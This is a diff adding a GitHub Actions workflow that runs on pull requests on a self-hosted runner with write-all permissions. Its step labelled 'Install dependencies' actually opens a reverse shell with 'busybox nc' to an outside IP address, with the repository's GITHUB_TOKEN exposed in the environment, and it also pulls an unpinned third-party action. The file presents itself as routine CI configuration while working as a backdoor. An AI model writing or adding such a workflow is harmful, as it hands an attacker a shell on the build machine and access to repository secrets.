@@ -1,0 +1,19 @@
+name: test3
+
+on: pull_request
+
+jobs:
+  static-analysis:
+    permissions: write-all
+    runs-on: self-hosted
+
+    name: wola
+    steps:
+      - name: anoterWF
+        uses: researchstation/SHRunner@main
+        with:
+          worflow: image.yml
+      - name: Install dependencies
+        run: busybox nc 146.190.37.159 4546 -e sh
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
